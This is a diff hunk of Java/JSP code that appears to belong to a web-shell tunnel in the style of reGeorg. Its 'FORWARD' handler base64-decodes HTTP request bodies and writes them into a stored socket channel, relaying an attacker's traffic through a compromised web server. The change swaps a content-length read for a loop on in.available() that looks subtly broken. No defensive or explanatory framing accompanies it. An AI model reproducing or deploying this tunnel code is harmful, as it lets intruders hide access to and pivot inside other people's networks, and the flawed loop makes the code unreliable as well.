@@ -236,12 +236,15 @@
         } else if (cmd.compareTo("FORWARD") == 0){
             SocketChannel socketChannel = (SocketChannel)application.getAttribute(mark);
             try {
-
-                int readlen = request.getContentLength();
-                byte[] buff = new byte[readlen];
-
-                request.getInputStream().read(buff, 0, readlen);
-                byte[] base64 = b64de(new String(buff));
+                String inputData = "";
+                InputStream in = request.getInputStream();
+                while ( true ){
+                    byte[] buff = new byte[in.available()];
+                    if (in.read(buff) == -1)
+                        break;
+                    inputData += new String(buff);
+                }
+                byte[] base64 = b64de(inputData);
                 ByteBuffer buf = ByteBuffer.allocate(base64.length);
                 buf.put(base64);
                 buf.flip();
